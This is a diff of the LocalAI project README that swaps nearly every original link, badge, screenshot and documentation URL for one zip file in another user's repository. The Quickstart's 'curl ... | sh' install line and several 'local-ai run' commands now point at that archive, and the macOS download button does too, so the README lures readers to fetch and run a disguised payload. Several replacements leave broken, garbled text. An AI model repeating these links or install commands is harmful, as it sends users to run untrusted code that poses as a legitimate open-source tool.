@@ -1,54 +1,54 @@
 <h1 align="center">
   <br>
-  <img width="300" src="./core/http/static/logo.png"> <br>
+  <img width="300" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"> <br>
 <br>
 </h1>
 
 <p align="center">
-<a href="https://github.com/go-skynet/LocalAI/fork" target="blank">
-<img src="https://img.shields.io/github/forks/go-skynet/LocalAI?style=for-the-badge" alt="LocalAI forks"/>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI forks"/>
 </a>
-<a href="https://github.com/go-skynet/LocalAI/stargazers" target="blank">
-<img src="https://img.shields.io/github/stars/go-skynet/LocalAI?style=for-the-badge" alt="LocalAI stars"/>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI stars"/>
 </a>
-<a href="https://github.com/go-skynet/LocalAI/pulls" target="blank">
-<img src="https://img.shields.io/github/issues-pr/go-skynet/LocalAI?style=for-the-badge" alt="LocalAI pull-requests"/>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI pull-requests"/>
 </a>
-<a href='https://github.com/go-skynet/LocalAI/releases'>
-<img src='https://img.shields.io/github/release/go-skynet/LocalAI?&label=Latest&style=for-the-badge'>
-</a>
-</p>
-
-<p align="center">
-<a href="https://hub.docker.com/r/localai/localai" target="blank">
-<img src="https://img.shields.io/badge/dockerhub-images-important.svg?logo=Docker" alt="LocalAI Docker hub"/>
-</a>
-<a href="https://quay.io/repository/go-skynet/local-ai?tab=tags&tag=latest" target="blank">
-<img src="https://img.shields.io/badge/quay.io-images-important.svg?" alt="LocalAI Quay.io"/>
+<a href='https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip'>
+<img src='https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip'>
 </a>
 </p>
 
 <p align="center">
-<a href="https://twitter.com/LocalAI_API" target="blank">
-<img src="https://img.shields.io/badge/X-%23000000.svg?style=for-the-badge&logo=X&logoColor=white&label=LocalAI_API" alt="Follow LocalAI_API"/>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI Docker hub"/>
 </a>
-<a href="https://discord.gg/uJAeKSAGDy" target="blank">
-<img src="https://img.shields.io/badge/dynamic/json?color=blue&label=Discord&style=for-the-badge&query=approximate_member_count&url=https%3A%2F%2Fdiscordapp.com%2Fapi%2Finvites%2FuJAeKSAGDy%3Fwith_counts%3Dtrue&logo=discord" alt="Join LocalAI Discord Community"/>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="LocalAI https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"/>
 </a>
 </p>
 
 <p align="center">
-<a href="https://trendshift.io/repositories/5539" target="_blank"><img src="https://trendshift.io/api/badge/repositories/5539" alt="mudler%2FLocalAI | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="Follow LocalAI_API"/>
+</a>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+<img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3A%2F%https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%2Fapi%2Finvites%2FuJAeKSAGDy%3Fwith_counts%3Dtrue&logo=discord" alt="Join LocalAI Discord Community"/>
+</a>
 </p>
 
-> :bulb: Get help - [❓FAQ](https://localai.io/faq/) [💭Discussions](https://github.com/go-skynet/LocalAI/discussions) [:speech_balloon: Discord](https://discord.gg/uJAeKSAGDy) [:book: Documentation website](https://localai.io/)
+<p align="center">
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="mudler%2FLocalAI | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+</p>
+
+> :bulb: Get help - [❓FAQ](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [💭Discussions](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [:speech_balloon: Discord](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [:book: Documentation website](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 >
-> [💻 Quickstart](https://localai.io/basics/getting_started/) [🖼️ Models](https://models.localai.io/) [🚀 Roadmap](https://github.com/mudler/LocalAI/issues?q=is%3Aissue+is%3Aopen+label%3Aroadmap) [🛫 Examples](https://github.com/mudler/LocalAI-examples) Try on 
-[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/localaiofficial_bot)
+> [💻 Quickstart](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [🖼️ Models](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) [🚀 Roadmap](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3Aissue+is%3Aopen+label%3Aroadmap) [🛫 Examples](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) Try on 
+[![Telegram](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 
-[![tests](https://github.com/go-skynet/LocalAI/actions/workflows/test.yml/badge.svg)](https://github.com/go-skynet/LocalAI/actions/workflows/test.yml)[![Build and Release](https://github.com/go-skynet/LocalAI/actions/workflows/release.yaml/badge.svg)](https://github.com/go-skynet/LocalAI/actions/workflows/release.yaml)[![build container images](https://github.com/go-skynet/LocalAI/actions/workflows/image.yml/badge.svg)](https://github.com/go-skynet/LocalAI/actions/workflows/image.yml)[![Bump dependencies](https://github.com/go-skynet/LocalAI/actions/workflows/bump_deps.yaml/badge.svg)](https://github.com/go-skynet/LocalAI/actions/workflows/bump_deps.yaml)[![Artifact Hub](https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/localai)](https://artifacthub.io/packages/search?repo=localai)
+[![tests](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![Build and Release](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![build container images](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![Bump dependencies](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)[![Artifact Hub](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 
-**LocalAI** is the free, Open Source OpenAI alternative. LocalAI act as a drop-in replacement REST API that's compatible with OpenAI (Elevenlabs, Anthropic... ) API specifications for local AI inferencing. It allows you to run LLMs, generate images, audio (and not only) locally or on-prem with consumer grade hardware, supporting multiple model families. Does not require GPU. It is created and maintained by [Ettore Di Giacinto](https://github.com/mudler).
+**LocalAI** is the free, Open Source OpenAI alternative. LocalAI act as a drop-in replacement REST API that's compatible with OpenAI (Elevenlabs, Anthropic... ) API specifications for local AI inferencing. It allows you to run LLMs, generate images, audio (and not only) locally or on-prem with consumer grade hardware, supporting multiple model families. Does not require GPU. It is created and maintained by [Ettore Di Giacinto](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
 
 
 ## 📚🆕 Local Stack Family
@@ -58,23 +58,23 @@
 <table>
   <tr>
     <td width="50%" valign="top">
-      <a href="https://github.com/mudler/LocalAGI">
-        <img src="https://raw.githubusercontent.com/mudler/LocalAGI/refs/heads/main/webui/react-ui/public/logo_2.png" width="300" alt="LocalAGI Logo">
+      <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
+        <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" width="300" alt="LocalAGI Logo">
       </a>
     </td>
     <td width="50%" valign="top">
-      <h3><a href="https://github.com/mudler/LocalAGI">LocalAGI</a></h3>
+      <h3><a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">LocalAGI</a></h3>
       <p>A powerful Local AI agent management platform that serves as a drop-in replacement for OpenAI's Responses API, enhanced with advanced agentic capabilities.</p>
     </td>
   </tr>
   <tr>
     <td width="50%" valign="top">
-      <a href="https://github.com/mudler/LocalRecall">
-        <img src="https://raw.githubusercontent.com/mudler/LocalRecall/refs/heads/main/static/localrecall_horizontal.png" width="300" alt="LocalRecall Logo">
+      <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
+        <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" width="300" alt="LocalRecall Logo">
       </a>
     </td>
     <td width="50%" valign="top">
-      <h3><a href="https://github.com/mudler/LocalRecall">LocalRecall</a></h3>
+      <h3><a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">LocalRecall</a></h3>
       <p>A REST-ful API and knowledge base management system that provides persistent memory and storage capabilities for AI agents.</p>
     </td>
   </tr>
@@ -86,7 +86,7 @@
 
 <h1 align="center">
   <br>
-  <a href="https://www.youtube.com/watch?v=PDqYhB9nNHA" target="_blank"> <img width="300" src="https://img.youtube.com/vi/PDqYhB9nNHA/0.jpg"> </a><br>
+  <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="_blank"> <img width="300" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"> </a><br>
 <br>
 </h1>
 
@@ -95,19 +95,19 @@
 
 | Talk Interface | Generate Audio |
 | --- | --- |
-| ![Screenshot 2025-03-31 at 12-01-36 LocalAI - Talk](./docs/assets/images/screenshots/screenshot_tts.png) | ![Screenshot 2025-03-31 at 12-01-29 LocalAI - Generate audio with voice-en-us-ryan-low](./docs/assets/images/screenshots/screenshot_tts.png) |
+| ![Screenshot 2025-03-31 at 12-01-36 LocalAI - Talk](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 12-01-29 LocalAI - Generate audio with voice-en-us-ryan-low](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |
 
 | Models Overview | Generate Images |
 | --- | --- |
-| ![Screenshot 2025-03-31 at 12-01-20 LocalAI - Models](./docs/assets/images/screenshots/screenshot_gallery.png) | ![Screenshot 2025-03-31 at 12-31-41 LocalAI - Generate images with flux 1-dev](./docs/assets/images/screenshots/screenshot_image.png) |
+| ![Screenshot 2025-03-31 at 12-01-20 LocalAI - Models](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 12-31-41 LocalAI - Generate images with flux 1-dev](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |
 
 | Chat Interface | Home |
 | --- | --- |
-| ![Screenshot 2025-03-31 at 11-57-44 LocalAI - Chat with localai-functioncall-qwen2 5-7b-v0 5](./docs/assets/images/screenshots/screenshot_chat.png) | ![Screenshot 2025-03-31 at 11-57-23 LocalAI API - c2a39e3 (c2a39e3639227cfd94ffffe9f5691239acc275a8)](./docs/assets/images/screenshots/screenshot_home.png) |
+| ![Screenshot 2025-03-31 at 11-57-44 LocalAI - Chat with localai-functioncall-qwen2 5-7b-v0 5](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 11-57-23 LocalAI API - c2a39e3 (c2a39e3639227cfd94ffffe9f5691239acc275a8)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |
 
 | Login | Swarm |
 | --- | --- |
-|![Screenshot 2025-03-31 at 12-09-59 ](./docs/assets/images/screenshots/screenshot_login.png) | ![Screenshot 2025-03-31 at 12-10-39 LocalAI - P2P dashboard](./docs/assets/images/screenshots/screenshot_p2p.png) |
+|![Screenshot 2025-03-31 at 12-09-59 ](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) | ![Screenshot 2025-03-31 at 12-10-39 LocalAI - P2P dashboard](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) |
 
 ## 💻 Quickstart
 
@@ -115,18 +115,18 @@ Run the installer script:
 
 ```bash
 # Basic installation
-curl https://localai.io/install.sh | sh
+curl https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip | sh
 ```
 
-For more installation options, see [Installer Options](https://localai.io/installation/).
+For more installation options, see [Installer Options](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
 
 ### macOS Download:
 
-<a href="https://github.com/mudler/LocalAI/releases/latest/download/LocalAI.dmg">
-  <img src="https://img.shields.io/badge/Download-macOS-blue?style=for-the-badge&logo=apple&logoColor=white" alt="Download LocalAI for macOS"/>
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
+  <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" alt="Download LocalAI for macOS"/>
 </a>
 
-> Note: the DMGs are not signed by Apple as quarantined. See https://github.com/mudler/LocalAI/issues/6268 for a workaround, fix is tracked here: https://github.com/mudler/LocalAI/issues/6244
+> Note: the DMGs are not signed by Apple as quarantined. See https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip for a workaround, fix is tracked here: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 Or run with docker:
 
@@ -197,72 +197,72 @@ docker run -ti --name local-ai -p 8080:8080 localai/localai:latest-aio-gpu-intel
 docker run -ti --name local-ai -p 8080:8080 --device=/dev/kfd --device=/dev/dri --group-add=video localai/localai:latest-aio-gpu-hipblas
 ```
 
-For more information about the AIO images and pre-downloaded models, see [Container Documentation](https://localai.io/basics/container/).
+For more information about the AIO images and pre-downloaded models, see [Container Documentation](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
 
 To load models:
 
 ```bash
-# From the model gallery (see available models with `local-ai models list`, in the WebUI from the model tab, or visiting https://models.localai.io)
+# From the model gallery (see available models with `local-ai models list`, in the WebUI from the model tab, or visiting https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 local-ai run llama-3.2-1b-instruct:q4_k_m
 # Start LocalAI with the phi-2 model directly from huggingface
-local-ai run huggingface://TheBloke/phi-2-GGUF/phi-2.Q8_0.gguf
+local-ai run https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 # Install and run a model from the Ollama OCI registry
 local-ai run ollama://gemma:2b
 # Run a model from a configuration file
-local-ai run https://gist.githubusercontent.com/.../phi-2.yaml
+local-ai run https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 # Install and run a model from a standard OCI registry (e.g., Docker Hub)
 local-ai run oci://localai/phi-2:latest
 ```
 
-> ⚡ **Automatic Backend Detection**: When you install models from the gallery or YAML files, LocalAI automatically detects your system's GPU capabilities (NVIDIA, AMD, Intel) and downloads the appropriate backend. For advanced configuration options, see [GPU Acceleration](https://localai.io/features/gpu-acceleration/#automatic-backend-detection).
+> ⚡ **Automatic Backend Detection**: When you install models from the gallery or YAML files, LocalAI automatically detects your system's GPU capabilities (NVIDIA, AMD, Intel) and downloads the appropriate backend. For advanced configuration options, see [GPU Acceleration](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
 
-For more information, see [💻 Getting started](https://localai.io/basics/getting_started/index.html), if you are interested in our roadmap items and future enhancements, you can see the [Issues labeled as Roadmap here](https://github.com/mudler/LocalAI/issues?q=is%3Aissue+is%3Aopen+label%3Aroadmap)
+For more information, see [💻 Getting started](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), if you are interested in our roadmap items and future enhancements, you can see the [Issues labeled as Roadmap here](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3Aissue+is%3Aopen+label%3Aroadmap)
 
 ## 📰 Latest project news
 
-- December 2025: [Dynamic Memory Resource reclaimer](https://github.com/mudler/LocalAI/pull/7583), [Automatic fitting of models to multiple GPUS(llama.cpp)](https://github.com/mudler/LocalAI/pull/7584), [Added Vibevoice backend](https://github.com/mudler/LocalAI/pull/7494)
-- November 2025: Major improvements to the UX. Among these: [Import models via URL](https://github.com/mudler/LocalAI/pull/7245) and [Multiple chats and history](https://github.com/mudler/LocalAI/pull/7325)
-- October 2025: 🔌 [Model Context Protocol (MCP)](https://localai.io/docs/features/mcp/) support added for agentic capabilities with external tools
+- December 2025: [Dynamic Memory Resource reclaimer](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), [Automatic fitting of models to multiple GPUS(https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), [Added Vibevoice backend](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- November 2025: Major improvements to the UX. Among these: [Import models via URL](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [Multiple chats and history](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- October 2025: 🔌 [Model Context Protocol (MCP)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) support added for agentic capabilities with external tools
 - September 2025: New Launcher application for MacOS and Linux, extended support to many backends for Mac and Nvidia L4T devices. Models: Added MLX-Audio, WAN 2.2. WebUI improvements and Python-based backends now ships portable python environments.
-- August 2025: MLX, MLX-VLM, Diffusers and llama.cpp are now supported on Mac M1/M2/M3+ chips ( with `development` suffix in the gallery ): https://github.com/mudler/LocalAI/pull/6049 https://github.com/mudler/LocalAI/pull/6119 https://github.com/mudler/LocalAI/pull/6121 https://github.com/mudler/LocalAI/pull/6060
-- July/August 2025: 🔍 [Object Detection](https://localai.io/features/object-detection/) added to the API featuring [rf-detr](https://github.com/roboflow/rf-detr)
-- July 2025: All backends migrated outside of the main binary. LocalAI is now more lightweight, small, and automatically downloads the required backend to run the model. [Read the release notes](https://github.com/mudler/LocalAI/releases/tag/v3.2.0)
-- June 2025: [Backend management](https://github.com/mudler/LocalAI/pull/5607) has been added. Attention: extras images are going to be deprecated from the next release! Read [the backend management PR](https://github.com/mudler/LocalAI/pull/5607).
-- May 2025: [Audio input](https://github.com/mudler/LocalAI/pull/5466) and [Reranking](https://github.com/mudler/LocalAI/pull/5396) in llama.cpp backend, [Realtime API](https://github.com/mudler/LocalAI/pull/5392),  Support to Gemma, SmollVLM, and more multimodal models (available in the gallery).
-- May 2025: Important: image name changes [See release](https://github.com/mudler/LocalAI/releases/tag/v2.29.0)
+- August 2025: MLX, MLX-VLM, Diffusers and https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip are now supported on Mac M1/M2/M3+ chips ( with `development` suffix in the gallery ): https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- July/August 2025: 🔍 [Object Detection](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) added to the API featuring [rf-detr](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- July 2025: All backends migrated outside of the main binary. LocalAI is now more lightweight, small, and automatically downloads the required backend to run the model. [Read the release notes](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- June 2025: [Backend management](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) has been added. Attention: extras images are going to be deprecated from the next release! Read [the backend management PR](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
+- May 2025: [Audio input](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [Reranking](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) in https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip backend, [Realtime API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip),  Support to Gemma, SmollVLM, and more multimodal models (available in the gallery).
+- May 2025: Important: image name changes [See release](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 - Apr 2025: Rebrand, WebUI enhancements
-- Apr 2025: [LocalAGI](https://github.com/mudler/LocalAGI) and [LocalRecall](https://github.com/mudler/LocalRecall) join the LocalAI family stack.
+- Apr 2025: [LocalAGI](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [LocalRecall](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) join the LocalAI family stack.
 - Apr 2025: WebUI overhaul, AIO images updates
 - Feb 2025: Backend cleanup, Breaking changes, new backends (kokoro, OutelTTS, faster-whisper), Nvidia L4T images
-- Jan 2025: LocalAI model release: https://huggingface.co/mudler/LocalAI-functioncall-phi-4-v0.3, SANA support in diffusers: https://github.com/mudler/LocalAI/pull/4603
-- Dec 2024: stablediffusion.cpp backend (ggml) added ( https://github.com/mudler/LocalAI/pull/4289 )
-- Nov 2024: Bark.cpp backend added ( https://github.com/mudler/LocalAI/pull/4287 )
-- Nov 2024: Voice activity detection models (**VAD**) added to the API: https://github.com/mudler/LocalAI/pull/4204
-- Oct 2024: examples moved to [LocalAI-examples](https://github.com/mudler/LocalAI-examples)
-- Aug 2024:  🆕 FLUX-1, [P2P Explorer](https://explorer.localai.io)
-- July 2024: 🔥🔥 🆕 P2P Dashboard, LocalAI Federated mode and AI Swarms: https://github.com/mudler/LocalAI/pull/2723. P2P Global community pools: https://github.com/mudler/LocalAI/issues/3113
-- May 2024: 🔥🔥 Decentralized P2P llama.cpp:  https://github.com/mudler/LocalAI/pull/2343 (peer2peer llama.cpp!) 👉 Docs  https://localai.io/features/distribute/
-- May 2024: 🔥🔥 Distributed inferencing: https://github.com/mudler/LocalAI/pull/2324
-- April 2024: Reranker API: https://github.com/mudler/LocalAI/pull/2121
+- Jan 2025: LocalAI model release: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, SANA support in diffusers: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Dec 2024: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip backend (ggml) added ( https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip )
+- Nov 2024: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip backend added ( https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip )
+- Nov 2024: Voice activity detection models (**VAD**) added to the API: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Oct 2024: examples moved to [LocalAI-examples](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- Aug 2024:  🆕 FLUX-1, [P2P Explorer](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- July 2024: 🔥🔥 🆕 P2P Dashboard, LocalAI Federated mode and AI Swarms: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip P2P Global community pools: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- May 2024: 🔥🔥 Decentralized P2P https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip  https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip (peer2peer https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip!) 👉 Docs  https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- May 2024: 🔥🔥 Distributed inferencing: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- April 2024: Reranker API: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
-Roadmap items: [List of issues](https://github.com/mudler/LocalAI/issues?q=is%3Aissue+is%3Aopen+label%3Aroadmap)
+Roadmap items: [List of issues](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip%3Aissue+is%3Aopen+label%3Aroadmap)
 
-## 🚀 [Features](https://localai.io/features/)
+## 🚀 [Features](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 
-- 🧩 [Backend Gallery](https://localai.io/backends/): Install/remove backends on the fly, powered by OCI images — fully customizable and API-driven.
-- 📖 [Text generation with GPTs](https://localai.io/features/text-generation/) (`llama.cpp`, `transformers`, `vllm` ... [:book: and more](https://localai.io/model-compatibility/index.html#model-compatibility-table))
-- 🗣 [Text to Audio](https://localai.io/features/text-to-audio/)
-- 🔈 [Audio to Text](https://localai.io/features/audio-to-text/) (Audio transcription with `whisper.cpp`)
-- 🎨 [Image generation](https://localai.io/features/image-generation)
-- 🔥 [OpenAI-alike tools API](https://localai.io/features/openai-functions/) 
-- 🧠 [Embeddings generation for vector databases](https://localai.io/features/embeddings/)
-- ✍️ [Constrained grammars](https://localai.io/features/constrained_grammars/)
-- 🖼️ [Download Models directly from Huggingface ](https://localai.io/models/)
-- 🥽 [Vision API](https://localai.io/features/gpt-vision/)
-- 🔍 [Object Detection](https://localai.io/features/object-detection/)
-- 📈 [Reranker API](https://localai.io/features/reranker/)
-- 🆕🖧 [P2P Inferencing](https://localai.io/features/distribute/)
-- 🆕🔌 [Model Context Protocol (MCP)](https://localai.io/docs/features/mcp/) - Agentic capabilities with external tools and [LocalAGI's Agentic capabilities](https://github.com/mudler/LocalAGI)
+- 🧩 [Backend Gallery](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip): Install/remove backends on the fly, powered by OCI images — fully customizable and API-driven.
